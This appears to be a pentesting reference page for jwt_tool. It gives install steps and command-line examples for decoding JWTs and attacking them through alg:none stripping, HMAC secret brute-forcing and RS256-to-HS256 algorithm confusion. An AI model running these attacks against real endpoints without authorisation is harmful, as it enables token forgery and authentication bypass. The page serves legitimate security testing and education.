---
title: jwt_tool
sidebar_position: 13
tags: [tool, jwt, auth, exploitation]
---

> **One-liner:** Python tool for decoding, analyzing, and attacking JWT tokens — covers all major JWT vulnerabilities.

## When to use it

- Any time you encounter JWT-based authentication
- Decoding a token to inspect its claims and algorithm
- Testing for known JWT attacks: alg:none, weak secret, RS256→HS256 confusion
- Brute-forcing a weak HMAC secret

## Install

```bash
# Clone to /opt
git clone https://github.com/ticarpi/jwt_tool /opt/jwt_tool

# Or install via pip
pip3 install jwt_tool
```

## Key commands

```bash
# Decode and inspect a token
python3 jwt_tool.py <TOKEN>

# Scan for vulnerabilities against a target endpoint
python3 jwt_tool.py <TOKEN> -t http://target/api/endpoint

# alg:none bypass (strip signature)
python3 jwt_tool.py <TOKEN> -X a

# Brute-force HMAC secret with a wordlist
python3 jwt_tool.py <TOKEN> -C -d wordlist.txt

# RS256 → HS256 algorithm confusion (provide server's public key)
python3 jwt_tool.py <TOKEN> -X k -pk public_key.pem
```

### Attack reference

| Flag | Attack |
|------|--------|
| `-X a` | `alg:none` — remove signature, set algorithm to none |
| `-C -d wordlist.txt` | Brute-force HMAC (HS256/384/512) secret |
| `-X k -pk public_key.pem` | Algorithm confusion: RS256 → HS256 using public key as secret |
| `-t <url>` | Auto-scan endpoint with multiple attack payloads |

:::tip 💡 Remember
Always start by decoding the token (`jwt_tool.py <TOKEN>`) — the `alg` header tells you which attacks are worth trying first.
:::
